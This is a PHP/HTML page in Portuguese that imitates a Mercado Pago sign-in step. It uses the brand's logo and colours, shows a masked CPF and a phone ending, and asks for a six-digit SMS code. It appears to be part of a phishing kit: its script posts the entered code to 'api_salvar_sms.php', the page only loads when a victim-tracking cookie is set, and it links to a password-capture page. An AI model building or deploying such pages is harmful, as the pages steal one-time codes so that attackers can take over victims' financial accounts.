<?php
// Validação de sessão e cookie (sem alterações)
session_start();
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insira o código SMS</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-fundo: #f5f5f5;
            --cor-card: #ffffff;
            --cor-borda: #ddd;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); display: flex; flex-direction: column; min-height: 100vh; }
        .main-header { background-color: var(--cor-amarela); padding: 0 48px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; }
        .main-header img { height: 37px; }

        /* --- MUDANÇA PRINCIPAL NO LAYOUT --- */
        .main-content {
            padding: 80px 24px;
            flex-grow: 1;
            display: flex; /* Ativa o Flexbox */
            flex-direction: column; /* Organiza os itens em coluna */
            align-items: center; /* Centraliza horizontalmente */
            text-align: center; /* Centraliza o texto */
        }
        
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 400; color: var(--cor-texto-primaria); line-height: 1.25; margin: 0 0 16px 0; }
        .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; max-width: 400px; }
        .user-info { display: inline-flex; align-items: center; gap: 12px; border: 1px solid var(--cor-borda); border-radius: 6px; padding: 12px; margin-bottom: 24px; }
        .user-info .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .user-info .details span { display: block; font-size: 14px; }
        .user-info .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
        .help-link { display: block; margin-top: 24px; color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
        
        .form-card { background-color: var(--cor-card); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; width: 100%; max-width: 380px; box-sizing: border-box; }
        .code-inputs { display: flex; gap: 10px; justify-content: center; margin: 24px 0; }
        .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid var(--cor-borda); border-radius: 6px; }
        .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
        .resend-timer { text-align: center; font-size: 12px; color: var(--cor-texto-secundaria); margin-bottom: 24px; }
        .actions { display: flex; gap: 16px; }
        .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; flex-grow: 1; }
        .btn-primary { background-color: var(--cor-azul); color: white; }
        .btn-secondary { background-color: transparent; color: var(--cor-azul); border-color: transparent; }
        .btn-secondary:hover { background-color: rgba(52, 131, 250, 0.1); }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <span class="session-start-label">INÍCIO DE SESSÃO</span>
        <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
        <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em 3819.</p>
        <div class="user-info">
            <div class="icon">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
            </div>
            <div class="details">
                <span>CPF: ***.194.198-**</span>
                <a href="index.php">Trocar conta</a>
            </div>
        </div>
        
        <div class="form-card">
            <form id="sms-form">
                <label>Digite o código</label>
                <div id="code-container" class="code-inputs">
                    <input type="tel" maxlength="1" pattern="[0-9]" required>
                    <input type="tel" maxlength="1" pattern="[0-9]" required>
                    <input type="tel" maxlength="1" pattern="[0-9]" required>
                    <input type="tel" maxlength="1" pattern="[0-9]" required>
                    <input type="tel" maxlength="1" pattern="[0-9]" required>
                    <input type="tel" maxlength="1" pattern="[0-9]" required>
                </div>
                <div class="resend-timer">Reenviar código em 00:47</div>
                <div class="actions">
                    <button type="submit" class="btn btn-primary">Confirmar código</button>
                    <a href="senha.php" class="btn btn-secondary">Escolher outro método</a>
                </div>
            </form>
        </div>
        <a href="#" class="help-link">Preciso de ajuda</a>
    </main>

    <script>
        // --- NENHUMA ALTERAÇÃO NA LÓGICA JAVASCRIPT ---
        const form = document.getElementById('sms-form');
        const inputs = [...form.querySelectorAll('.code-inputs input')];

        form.addEventListener('input', (e) => {
            const target = e.target;
            const index = inputs.indexOf(target);
            if (target.value && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        });

        form.addEventListener('keydown', (e) => {
            const target = e.target;
            const index = inputs.indexOf(target);
            if (e.key === "Backspace" && !target.value && index > 0) {
                inputs[index - 1].focus();
            }
        });

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = inputs.map(input => input.value).join('');

            if (code.length === 6) {
                try {
                    const response = await fetch('api_salvar_sms.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sms_code: code })
                    });
                    const result = await response.json();
                    
                    if (result.success) {
                        alert('Código recebido! A página será atualizada.');
                        window.location.reload();
                    } else {
                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
                    }
                } catch (error) {
                    alert('Erro de conexão com o servidor.');
                }
            } else {
                alert('Por favor, preencha todos os 6 dígitos.');
            }
        });
    </script>
</body>
</html>